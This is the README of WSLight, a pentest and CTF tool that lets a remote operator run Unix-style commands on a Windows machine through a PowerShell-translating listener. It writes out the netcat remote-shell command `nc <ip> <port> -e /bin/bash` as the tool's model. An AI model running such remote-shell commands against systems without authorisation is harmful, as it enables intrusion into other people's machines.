
# WSLight

Remote shell on windows with Unix command

##  Table of contents

 - [🔦 Idea](#-idea)
 - [💺 Installation](#-installation)
 - [🚀 Usage](#-usage)
	
## 🔦 Idea
**Aim?**

Providing equivalent of bash (Unix cmd) on Windows, like if we would launch `nc <ip> <port> -e /bin/bash`

> Powershell & cmd already exist!

Exactly, but if you are not very comfortable with it and you have more references with unix commands

> [WSL](https://itsfoss.com/install-bash-on-windows/) already exists  and provides more utilities!

Yes but it requires  admin privileges to enable it. 



**Use cases?**

 - CTF, pentest etc with remote shell on windows device


 ## 💺 Installation

 ## 🚀 Usage 
 
 WSLight uses 2 utility:

 - wslight-cli: CLI used on your machine to interact with the windows machine
 - wslight: used on Windows machine to catch unix cmd from your machine and translate in Powershell

### Establish connection
On windows machine launch the listener:

    (Windows) > wslight listen <port>

On your machine:
```
$ export WSLIGHT_IP=<windows_ip> WSLIGHT_PORT=<wslight_listener_port>
$ 
```
or
```
$ wslight-cli -remote="<windows_ip>:<wslight_listener_port>"
```

### Launch command
Example with wget:

    (wslight-cli) > wget http://10.10.40.40:888
 
### See equivalent cmd in Powershell
~ `bash +x`, it is used to see what command will be executed:

    (wslight-cli) > debug <cmd> <args>

